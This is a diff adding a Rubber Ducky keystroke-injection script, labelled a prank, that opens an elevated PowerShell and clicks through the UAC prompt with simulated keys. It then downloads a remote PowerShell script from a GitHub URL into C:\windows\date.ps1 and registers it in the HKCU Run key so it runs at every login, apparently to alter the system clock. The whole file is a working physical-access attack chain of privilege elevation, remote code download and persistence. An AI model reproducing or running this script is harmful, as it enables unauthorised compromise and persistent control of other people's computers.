@@ -1,0 +1,25 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Creates a PowerShell script that will run on startup and change date and time after 10 minutes 
+REM Version:	1.0
+REM Category:	Serious-FUN
+DELAY 750
+WINDOWS d
+DELAY 950
+WINDOWS r
+DELAY 650
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 850
+ALT y
+DELAY 1200
+STRING $url = "https://github.com/UNC0V3R3D/ressources/blob/main/date.ps1"; $output = "C:\windows\date.ps1"; Invoke-WebRequest -Uri $url -OutFile $output; 
+DELAY 400
+ENTER
+DELAY 600
+STRING New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" ` -Name "date" ` -Value "C:\windows\date.ps1"
+DELAY 400
+ENTER
+exit
